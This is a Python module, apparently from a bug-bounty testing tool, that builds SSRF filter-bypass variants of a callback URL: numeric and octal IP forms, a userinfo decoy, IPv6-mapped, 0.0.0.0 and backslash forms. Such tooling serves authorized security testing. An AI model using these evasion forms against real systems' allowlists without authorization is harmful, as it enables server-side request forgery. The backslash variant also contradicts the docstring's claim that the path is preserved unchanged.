"""SSRF parser-bypass variants: the filter-evasion layer hunters try next.

A direct callback proves the_fetch_ happens. When it does not, the next
hunter step is asking whether a naive allowlist/blocklist was checked
against a different parse than the fetcher used. This module builds
bounded, provider-compatible URL variants of one callback URL:

- decimal / hexadecimal / octal forms of IPv4-literal callback hosts
  (string-matching allowlists and denylists routinely miss these while
  resolvers and HTTP clients accept them);
- a userinfo-decoy form (``scheme://<in-scope-decoy>@<callback>/...``)
  that prefix-checking validators attribute to the decoy host.

Safety contract (bounded, fail-closed):
- at most 5 variants per callback, deterministic order;
- the callback path (which carries the per-request nonce) is preserved
  byte-for-byte, so per-request attribution still holds;
- ports are preserved; userinfo form requires an explicit in-scope
  decoy host (normally the target's own host) and is skipped without one;
- non-IP-literal hosts get no IP variants; malformed callbacks yield [].
"""
import ipaddress
from typing import List, Tuple
from urllib.parse import urlsplit, urlunsplit

MAX_VARIANTS = 5


def _split_netloc(netloc: str) -> Tuple[str, str]:
    """Split host and port (no userinfo expected on callback URLs)."""
    if "@" in netloc:
        return "", ""
    if netloc.startswith("["):
        host, _, rest = netloc[1:].partition("]:")
        return ("", "") if not host else (host, rest)
    host, sep, port = netloc.rpartition(":")
    if sep and port.isdigit():
        return host, port
    return netloc, ""


def ip_literal_variants(callback_url: str) -> List[Tuple[str, str]]:
    """Decimal/hex/octal host forms for IPv4-literal callbacks."""
    try:
        parts = urlsplit(callback_url)
    except (TypeError, ValueError):
        return []
    host, port = _split_netloc(parts.netloc or "")
    try:
        addr = ipaddress.IPv4Address(host)
    except (ValueError, ipaddress.AddressValueError):
        return []
    if not host or ":" in host or "/" in host:
        return []
    num = int(addr)
    quads = [str((num >> shift) & 0xFF) for shift in (24, 16, 8, 0)]
    forms = [
        ("decimal-ip", str(num)),
        ("hex-ip", ".".join([f"0x{int(quads[0]):x}"] + quads[1:])),
        ("octal-ip", ".".join([f"0{int(quads[0]):o}"] + quads[1:])),
    ]
    out = []
    for kind, host_form in forms:
        netloc = host_form if not port else f"{host_form}:{port}"
        rebuilt = urlunsplit((parts.scheme, netloc, parts.path,
                              parts.query, ""))
        if rebuilt != callback_url:
            out.append((kind, rebuilt))
    return out


def userinfo_decoy_variant(callback_url: str,
                           decoy_host: str) -> List[Tuple[str, str]]:
    """Prefix-confusion form using an in-scope decoy host."""
    try:
        parts = urlsplit(callback_url)
    except (TypeError, ValueError):
        return []
    decoy = (decoy_host or "").strip().lower()
    if not decoy or "@" in decoy or "/" in decoy or " " in decoy:
        return []
    if "@" in (parts.netloc or ""):
        return []
    rebuilt = urlunsplit((parts.scheme, f"{decoy}@{parts.netloc}",
                          parts.path, parts.query, ""))
    if rebuilt == callback_url:
        return []
    return [("userinfo-decoy", rebuilt)]


def ipv6_bracket_variant(callback_url: str) -> List[Tuple[str, str]]:
    """IPv4-mapped IPv6 form for IPv4-literal callbacks."""
    try:
        parts = urlsplit(callback_url)
    except (TypeError, ValueError):
        return []
    host, port = _split_netloc(parts.netloc or "")
    try:
        ipaddress.IPv4Address(host)
    except (ValueError, ipaddress.AddressValueError):
        return []
    if not host:
        return []
    netloc = f"[::ffff:{host}]" if not port else f"[::ffff:{host}]:{port}"
    rebuilt = urlunsplit((parts.scheme, netloc, parts.path,
                          parts.query, ""))
    if rebuilt == callback_url:
        return []
    return [("ipv6-bracket", rebuilt)]


def zero_ip_variant(callback_url: str) -> List[Tuple[str, str]]:
    """0.0.0.0 form for loopback callbacks (string denylists miss it)."""
    try:
        parts = urlsplit(callback_url)
    except (TypeError, ValueError):
        return []
    host, port = _split_netloc(parts.netloc or "")
    try:
        addr = ipaddress.IPv4Address(host)
    except (ValueError, ipaddress.AddressValueError):
        return []
    if not addr.is_loopback:
        return []
    netloc = "0.0.0.0" if not port else f"0.0.0.0:{port}"
    rebuilt = urlunsplit((parts.scheme, netloc, parts.path,
                          parts.query, ""))
    if rebuilt == callback_url:
        return []
    return [("zero-ip", rebuilt)]


def backslash_variant(callback_url: str) -> List[Tuple[str, str]]:
    """Backslash form: fetchers that normalize like browsers see the
    same request while naive prefix/split validators see another string."""
    if not isinstance(callback_url, str) or "://" not in callback_url:
        return []
    scheme, _, rest = callback_url.partition("://")
    if scheme.lower() not in ("http", "https") or not rest:
        return []
    rebuilt = f"{scheme}:\\\\{rest.replace('/', chr(92))}"
    if rebuilt == callback_url:
        return []
    return [("backslash", rebuilt)]


def bypass_variants(callback_url: str, target_host: str = ""
                    ) -> List[Tuple[str, str]]:
    """Ordered, capped bypass variants for one callback URL.

    Octal and backslash forms rank last (narrow fetcher support) and
    are cut first when the cap binds.
    """
    ip_forms = ip_literal_variants(callback_url)
    decimal = [v for v in ip_forms if v[0] == "decimal-ip"]
    hexed = [v for v in ip_forms if v[0] == "hex-ip"]
    octal = [v for v in ip_forms if v[0] == "octal-ip"]
    variants = (decimal
                + userinfo_decoy_variant(callback_url, target_host)
                + hexed
                + ipv6_bracket_variant(callback_url)
                + zero_ip_variant(callback_url)
                + octal
                + backslash_variant(callback_url))
    seen, ordered = set(), []
    for kind, url in variants:
        if url not in seen:
            seen.add(url)
            ordered.append((kind, url))
    return ordered[:MAX_VARIANTS]
